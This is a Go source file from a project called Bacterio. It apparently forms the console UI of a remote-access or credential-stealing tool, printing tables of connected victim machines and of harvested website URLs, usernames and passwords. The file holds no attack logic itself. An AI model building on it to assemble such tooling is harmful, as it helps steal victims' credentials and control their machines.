package ui

import (
	"os"

	"github.com/fr13n8/Bacterio/internal/models"
	"github.com/fr13n8/Bacterio/pkg/system"
	"github.com/jedib0t/go-pretty/table"
)

func StartUi(ver string) {
	system.ClearScreen()
	ShowHeader()
	ShowInfo(ver)
}

func RenderTableOfConnects(connects map[string]*models.Connect) {
	t := table.NewWriter()
	t.SetOutputMirror(os.Stdout)
	t.Style().Options.SeparateRows = true
	t.AppendHeader(table.Row{"id", "OS", "User ID", "Hostname", "Username", "Local IP", "Public IP", "Mac Address"})

	var count int
	for _, connect := range connects {
		count++
		t.AppendRows([]table.Row{
			{count, connect.OSName, connect.UserID, connect.Hostname, connect.Username, connect.LocalIPAddress, connect.PublicIpAddress, connect.MacAddress},
		})
	}

	t.Render()
}

func RenderTableOfCredentials(credsArray []*models.Credentials) {
	t := table.NewWriter()
	t.SetOutputMirror(os.Stdout)
	t.Style().Options.SeparateRows = true
	t.AppendHeader(table.Row{"id", "URL", "Username", "Password"})

	var count int
	for _, data := range credsArray {
		count++
		t.AppendRows([]table.Row{
			{count, data.OriginUrl, data.UsernameValue, data.PasswordValue},
		})
	}

	t.Render()
}
